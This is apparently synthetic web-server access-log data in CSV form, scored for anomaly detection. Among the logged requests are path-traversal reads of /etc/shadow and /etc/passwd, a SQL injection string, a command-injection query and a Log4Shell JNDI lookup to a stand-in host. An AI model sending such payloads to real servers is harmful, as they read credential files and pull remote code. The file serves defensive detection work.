score_content,score_session,score_fused,score_fused_norm,line
26.614748001098633,,26.614748001098633,26.614748001098633,{"remote_addr": "217.154.8.6", "time_local": "11/Jan/2025:09:03:30 -0700", "request": "POST /api/backup?file=../../../../etc/shadow HTTP/2", "status": 200, "body_bytes_sent": 8109, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "curl/7.85.0"}
34.840675354003906,,34.840675354003906,34.840675354003906,{"remote_addr": "132.192.21.146", "time_local": "11/Jan/2025:09:03:31 -0700", "request": "PUT /search?q=headphones HTTP/2", "status": 200, "body_bytes_sent": 239, "http_referer": "-", "http_user_agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"}
26.619077682495117,,26.619077682495117,26.619077682495117,{"remote_addr": "91.110.47.246", "time_local": "11/Jan/2025:09:03:31 -0700", "request": "POST /api/product?id=123 HTTP/2", "status": 200, "body_bytes_sent": 7144, "http_referer": "https://www.google.com/", "http_user_agent": "curl/7.85.0"}
12.847765922546387,,12.847765922546387,12.847765922546387,{"remote_addr": "154.150.213.185", "time_local": "11/Jan/2025:09:03:32 -0700", "request": "PUT /logout HTTP/2", "status": 200, "body_bytes_sent": 6337, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "curl/7.85.0"}
0.2938525974750519,,0.2938525974750519,0.2938525974750519,{"remote_addr": "231.120.79.151", "time_local": "11/Jan/2025:09:03:33 -0700", "request": "GET /wp-login.php HTTP/2", "status": 200, "body_bytes_sent": 4629, "http_referer": "https://www.google.com/", "http_user_agent": "nikto/2.5.0"}
13.774982452392578,,13.774982452392578,13.774982452392578,{"remote_addr": "87.127.8.210", "time_local": "11/Jan/2025:09:03:34 -0700", "request": "PUT /../../etc/passwd HTTP/2", "status": 304, "body_bytes_sent": 17167, "http_referer": "https://www.google.com/", "http_user_agent": "python-requests/2.31.0"}
26.666074752807617,,26.666074752807617,26.666074752807617,{"remote_addr": "131.82.111.1", "time_local": "11/Jan/2025:09:03:35 -0700", "request": "GET /search?q=router HTTP/2", "status": 304, "body_bytes_sent": 5428, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"}
68.64096069335938,,68.64096069335938,68.64096069335938,{"remote_addr": "7.16.33.29", "time_local": "11/Jan/2025:09:03:36 -0700", "request": "HEAD /search?q=ssd HTTP/2", "status": 200, "body_bytes_sent": 14804, "http_referer": "https://twitter.com/", "http_user_agent": "sqlmap/1.7.2#stable"}
30247.26171875,,30247.26171875,30247.26171875,{"remote_addr": "138.116.100.71", "time_local": "11/Jan/2025:09:03:36 -0700", "request": "TRACE /search?q=camera HTTP/2", "status": 403, "body_bytes_sent": 1165, "http_referer": "https://www.google.com/", "http_user_agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"}
102.9204330444336,,102.9204330444336,102.9204330444336,{"remote_addr": "233.212.21.114", "time_local": "11/Jan/2025:09:03:37 -0700", "request": "TRACE /dashboard HTTP/2", "status": 204, "body_bytes_sent": 7418, "http_referer": "https://twitter.com/", "http_user_agent": "curl/7.85.0"}
1.9668960571289062,,1.9668960571289062,1.9668960571289062,{"remote_addr": "202.126.190.241", "time_local": "11/Jan/2025:09:03:38 -0700", "request": "GET /profile HTTP/2", "status": 204, "body_bytes_sent": 10862, "http_referer": "-", "http_user_agent": "nikto/2.5.0"}
93.95563507080078,,93.95563507080078,93.95563507080078,{"remote_addr": "3.147.72.57", "time_local": "11/Jan/2025:09:03:38 -0700", "request": "OPTIONS /search?q=camera HTTP/2", "status": 200, "body_bytes_sent": 13639, "http_referer": "https://www.google.com/", "http_user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"}
105.58686828613281,,105.58686828613281,105.58686828613281,{"remote_addr": "43.122.210.16", "time_local": "11/Jan/2025:09:03:38 -0700", "request": "TRACE /contact HTTP/2", "status": 302, "body_bytes_sent": 942, "http_referer": "-", "http_user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"}
93.95016479492188,,93.95016479492188,93.95016479492188,{"remote_addr": "163.65.123.32", "time_local": "11/Jan/2025:09:03:39 -0700", "request": "OPTIONS /search?q=camera HTTP/2", "status": 200, "body_bytes_sent": 11947, "http_referer": "https://www.google.com/", "http_user_agent": "Wget/1.21.2 (linux-gnu)"}
1.9005213975906372,,1.9005213975906372,1.9005213975906372,{"remote_addr": "110.187.76.129", "time_local": "11/Jan/2025:09:03:40 -0700", "request": "GET /api/products HTTP/2", "status": 200, "body_bytes_sent": 281, "http_referer": "-", "http_user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"}
101.65697479248047,,101.65697479248047,101.65697479248047,{"remote_addr": "133.209.197.202", "time_local": "11/Jan/2025:09:03:40 -0700", "request": "TRACE /.env HTTP/2", "status": 200, "body_bytes_sent": 10422, "http_referer": "https://example.com/", "http_user_agent": "dirb/2.22"}
26.82147979736328,,26.82147979736328,26.82147979736328,{"remote_addr": "146.17.66.216", "time_local": "11/Jan/2025:09:03:41 -0700", "request": "DELETE /profile HTTP/2", "status": 201, "body_bytes_sent": 13225, "http_referer": "https://www.google.com/", "http_user_agent": "dirb/2.22"}
125.06494903564453,,125.06494903564453,125.06494903564453,{"remote_addr": "86.254.23.113", "time_local": "11/Jan/2025:09:03:42 -0700", "request": "TRACE /search?q=camera HTTP/2", "status": 201, "body_bytes_sent": 16217, "http_referer": "https://www.google.com/", "http_user_agent": "sqlmap/1.7.2#stable"}
1.948706030845642,,1.948706030845642,1.948706030845642,{"remote_addr": "153.153.90.228", "time_local": "11/Jan/2025:09:03:43 -0700", "request": "GET /profile HTTP/2", "status": 200, "body_bytes_sent": 4950, "http_referer": "-", "http_user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"}
46.450504302978516,,46.450504302978516,46.450504302978516,{"remote_addr": "170.103.4.214", "time_local": "11/Jan/2025:09:03:44 -0700", "request": "HEAD /api/products HTTP/2", "status": 200, "body_bytes_sent": 17461, "http_referer": "https://www.google.com/", "http_user_agent": "sqlmap/1.7.2#stable"}
45.12437438964844,,45.12437438964844,45.12437438964844,{"remote_addr": "211.158.163.238", "time_local": "11/Jan/2025:09:03:44 -0700", "request": "HEAD /.env HTTP/2", "status": 200, "body_bytes_sent": 3869, "http_referer": "https://twitter.com/", "http_user_agent": "dirb/2.22"}
74.46015167236328,,74.46015167236328,74.46015167236328,{"remote_addr": "96.58.174.224", "time_local": "11/Jan/2025:09:03:45 -0700", "request": "OPTIONS /dashboard HTTP/2", "status": 302, "body_bytes_sent": 17378, "http_referer": "-", "http_user_agent": "Wget/1.21.2 (linux-gnu)"}
12.766633033752441,,12.766633033752441,12.766633033752441,{"remote_addr": "160.201.169.229", "time_local": "11/Jan/2025:09:03:46 -0700", "request": "PUT /api/products HTTP/2", "status": 200, "body_bytes_sent": 16528, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"}
2.761056661605835,,2.761056661605835,2.761056661605835,{"remote_addr": "115.202.115.84", "time_local": "11/Jan/2025:09:03:47 -0700", "request": "GET /..%2f..%2fetc%2fpasswd HTTP/2", "status": 301, "body_bytes_sent": 15801, "http_referer": "-", "http_user_agent": "sqlmap/1.7.2#stable"}
45.15195083618164,,45.15195083618164,45.15195083618164,{"remote_addr": "164.190.15.137", "time_local": "11/Jan/2025:09:03:48 -0700", "request": "HEAD /.env HTTP/2", "status": 204, "body_bytes_sent": 12625, "http_referer": "https://twitter.com/", "http_user_agent": "curl/7.85.0"}
125.024658203125,,125.024658203125,125.024658203125,{"remote_addr": "22.22.151.23", "time_local": "11/Jan/2025:09:03:48 -0700", "request": "TRACE /api/backup?file=../../../../etc/shadow HTTP/2", "status": 200, "body_bytes_sent": 3147, "http_referer": "-", "http_user_agent": "dirb/2.22"}
24.038599014282227,,24.038599014282227,24.038599014282227,{"remote_addr": "203.33.198.192", "time_local": "11/Jan/2025:09:03:49 -0700", "request": "GET /search?q=phone HTTP/2", "status": 200, "body_bytes_sent": 6548, "http_referer": "https://www.google.com/", "http_user_agent": "nikto/2.5.0"}
103.06291961669922,,103.06291961669922,103.06291961669922,{"remote_addr": "88.10.175.123", "time_local": "11/Jan/2025:09:03:49 -0700", "request": "TRACE /login HTTP/2", "status": 200, "body_bytes_sent": 5688, "http_referer": "https://example.com/", "http_user_agent": "dirb/2.22"}
48.916908264160156,,48.916908264160156,48.916908264160156,{"remote_addr": "165.112.22.144", "time_local": "11/Jan/2025:09:03:50 -0700", "request": "DELETE /search?q=ssd HTTP/2", "status": 200, "body_bytes_sent": 1414, "http_referer": "https://www.google.com/", "http_user_agent": "curl/7.85.0"}
124.98638153076172,,124.98638153076172,124.98638153076172,{"remote_addr": "5.247.235.242", "time_local": "11/Jan/2025:09:03:51 -0700", "request": "TRACE /search?q=headphones HTTP/2", "status": 200, "body_bytes_sent": 14857, "http_referer": "https://twitter.com/", "http_user_agent": "sqlmap/1.7.2#stable"}
68.46258544921875,,68.46258544921875,68.46258544921875,{"remote_addr": "54.87.111.119", "time_local": "11/Jan/2025:09:03:52 -0700", "request": "HEAD /search?q=headphones HTTP/2", "status": 200, "body_bytes_sent": 6800, "http_referer": "https://example.com/", "http_user_agent": "python-requests/2.31.0"}
30193.095703125,,30193.095703125,30193.095703125,{"remote_addr": "102.162.159.212", "time_local": "11/Jan/2025:09:03:53 -0700", "request": "OPTIONS /../../etc/passwd HTTP/2", "status": 400, "body_bytes_sent": 106, "http_referer": "-", "http_user_agent": "curl/7.85.0"}
74.50015258789062,,74.50015258789062,74.50015258789062,{"remote_addr": "222.151.115.170", "time_local": "11/Jan/2025:09:03:53 -0700", "request": "OPTIONS /contact HTTP/2", "status": 302, "body_bytes_sent": 8691, "http_referer": "https://www.google.com/", "http_user_agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"}
105.41281127929688,,105.41281127929688,105.41281127929688,{"remote_addr": "210.45.9.117", "time_local": "11/Jan/2025:09:03:54 -0700", "request": "TRACE /server-status HTTP/2", "status": 301, "body_bytes_sent": 13191, "http_referer": "https://www.google.com/", "http_user_agent": "dirb/2.22"}
25.168489456176758,,25.168489456176758,25.168489456176758,{"remote_addr": "71.131.119.250", "time_local": "11/Jan/2025:09:03:54 -0700", "request": "DELETE /.git/config HTTP/2", "status": 204, "body_bytes_sent": 3144, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "python-requests/2.31.0"}
11059.923828125,,11059.923828125,11059.923828125,{"remote_addr": "135.92.175.250", "time_local": "11/Jan/2025:09:03:55 -0700", "request": "GET /search?q=router HTTP/2", "status": 500, "body_bytes_sent": 500, "http_referer": "https://www.google.com/", "http_user_agent": "sqlmap/1.7.2#stable"}
2.8687970638275146,,2.8687970638275146,2.8687970638275146,{"remote_addr": "93.150.65.59", "time_local": "11/Jan/2025:09:03:56 -0700", "request": "GET /assets/app.css HTTP/2", "status": 302, "body_bytes_sent": 1718, "http_referer": "https://twitter.com/", "http_user_agent": "nikto/2.5.0"}
0.29708632826805115,,0.29708632826805115,0.29708632826805115,{"remote_addr": "172.164.159.95", "time_local": "11/Jan/2025:09:03:56 -0700", "request": "GET /assets/app.js HTTP/2", "status": 200, "body_bytes_sent": 11980, "http_referer": "-", "http_user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"}
1.974554181098938,,1.974554181098938,1.974554181098938,{"remote_addr": "100.185.113.238", "time_local": "11/Jan/2025:09:03:57 -0700", "request": "GET /contact HTTP/2", "status": 200, "body_bytes_sent": 11308, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "Wget/1.21.2 (linux-gnu)"}
127.49560546875,,127.49560546875,127.49560546875,{"remote_addr": "96.54.91.64", "time_local": "11/Jan/2025:09:03:57 -0700", "request": "TRACE /search?q=%27+OR+1%3D1+-- HTTP/2", "status": 301, "body_bytes_sent": 8812, "http_referer": "-", "http_user_agent": "sqlmap/1.7.2#stable"}
2.8717193603515625,,2.8717193603515625,2.8717193603515625,{"remote_addr": "48.92.116.173", "time_local": "11/Jan/2025:09:03:58 -0700", "request": "POST /wp-login.php HTTP/2", "status": 200, "body_bytes_sent": 4271, "http_referer": "-", "http_user_agent": "curl/7.85.0"}
29.216773986816406,,29.216773986816406,29.216773986816406,{"remote_addr": "240.65.173.148", "time_local": "11/Jan/2025:09:03:59 -0700", "request": "POST /search?q=router HTTP/2", "status": 302, "body_bytes_sent": 10599, "http_referer": "https://twitter.com/", "http_user_agent": "curl/7.85.0"}
93.95549774169922,,93.95549774169922,93.95549774169922,{"remote_addr": "2.135.164.160", "time_local": "11/Jan/2025:09:04:00 -0700", "request": "OPTIONS /api/product?id=123 HTTP/2", "status": 200, "body_bytes_sent": 8363, "http_referer": "-", "http_user_agent": "dirb/2.22"}
4.606866836547852,,4.606866836547852,4.606866836547852,{"remote_addr": "166.249.126.194", "time_local": "11/Jan/2025:09:04:00 -0700", "request": "POST /logout HTTP/2", "status": 200, "body_bytes_sent": 16347, "http_referer": "-", "http_user_agent": "sqlmap/1.7.2#stable"}
51.45673751831055,,51.45673751831055,51.45673751831055,{"remote_addr": "11.27.43.164", "time_local": "11/Jan/2025:09:04:01 -0700", "request": "DELETE /api/product?id=123 HTTP/2", "status": 301, "body_bytes_sent": 8407, "http_referer": "https://twitter.com/", "http_user_agent": "sqlmap/1.7.2#stable"}
4.86643648147583,,4.86643648147583,4.86643648147583,{"remote_addr": "123.243.148.242", "time_local": "11/Jan/2025:09:04:02 -0700", "request": "POST / HTTP/2", "status": 200, "body_bytes_sent": 17885, "http_referer": "https://example.com/", "http_user_agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"}
51.44696044921875,,51.44696044921875,51.44696044921875,{"remote_addr": "92.182.11.122", "time_local": "11/Jan/2025:09:04:03 -0700", "request": "DELETE /api/run?cmd=cat+%2Fetc%2Fpasswd HTTP/2", "status": 304, "body_bytes_sent": 12230, "http_referer": "https://www.google.com/", "http_user_agent": "nikto/2.5.0"}
12.726836204528809,,12.726836204528809,12.726836204528809,{"remote_addr": "223.236.126.254", "time_local": "11/Jan/2025:09:04:04 -0700", "request": "PUT /api/products HTTP/2", "status": 200, "body_bytes_sent": 712, "http_referer": "-", "http_user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"}
26.688518524169922,,26.688518524169922,26.688518524169922,{"remote_addr": "150.167.169.19", "time_local": "11/Jan/2025:09:04:05 -0700", "request": "POST /?id=%24%7Bjndi%3Aldap%3A%2F%2Fevil.tld%2Fa%7D HTTP/2", "status": 200, "body_bytes_sent": 6217, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "python-requests/2.31.0"}
29.257692337036133,,29.257692337036133,29.257692337036133,{"remote_addr": "96.59.80.161", "time_local": "11/Jan/2025:09:04:06 -0700", "request": "POST /api/backup?file=../../../../etc/shadow HTTP/2", "status": 304, "body_bytes_sent": 7594, "http_referer": "https://example.com/", "http_user_agent": "dirb/2.22"}
72.89342498779297,,72.89342498779297,72.89342498779297,{"remote_addr": "30.47.75.240", "time_local": "11/Jan/2025:09:04:07 -0700", "request": "OPTIONS /index.html HTTP/2", "status": 301, "body_bytes_sent": 1889, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "dirb/2.22"}
30157.880859375,,30157.880859375,30157.880859375,{"remote_addr": "130.165.44.26", "time_local": "11/Jan/2025:09:04:08 -0700", "request": "PUT /search?q=%27+OR+1%3D1+-- HTTP/2", "status": 404, "body_bytes_sent": 311, "http_referer": "https://twitter.com/", "http_user_agent": "dirb/2.22"}
30124.26171875,,30124.26171875,30124.26171875,{"remote_addr": "210.241.225.11", "time_local": "11/Jan/2025:09:04:09 -0700", "request": "GET /index.html HTTP/2", "status": 403, "body_bytes_sent": 975, "http_referer": "https://example.com/", "http_user_agent": "nikto/2.5.0"}
46.56679916381836,,46.56679916381836,46.56679916381836,{"remote_addr": "93.136.53.254", "time_local": "11/Jan/2025:09:04:10 -0700", "request": "HEAD /about HTTP/2", "status": 200, "body_bytes_sent": 6116, "http_referer": "https://example.com/", "http_user_agent": "curl/7.85.0"}
30157.904296875,,30157.904296875,30157.904296875,{"remote_addr": "197.202.238.119", "time_local": "11/Jan/2025:09:04:11 -0700", "request": "PUT /search?q=ssd HTTP/2", "status": 400, "body_bytes_sent": 522, "http_referer": "https://example.com/", "http_user_agent": "Wget/1.21.2 (linux-gnu)"}
125.0456771850586,,125.0456771850586,125.0456771850586,{"remote_addr": "139.240.71.215", "time_local": "11/Jan/2025:09:04:12 -0700", "request": "TRACE /search?q=laptop HTTP/2", "status": 200, "body_bytes_sent": 463, "http_referer": "https://twitter.com/", "http_user_agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"}
0.359413743019104,,0.359413743019104,0.359413743019104,{"remote_addr": "60.90.62.75", "time_local": "11/Jan/2025:09:04:13 -0700", "request": "GET /index.html HTTP/2", "status": 200, "body_bytes_sent": 6298, "http_referer": "https://www.google.com/", "http_user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"}
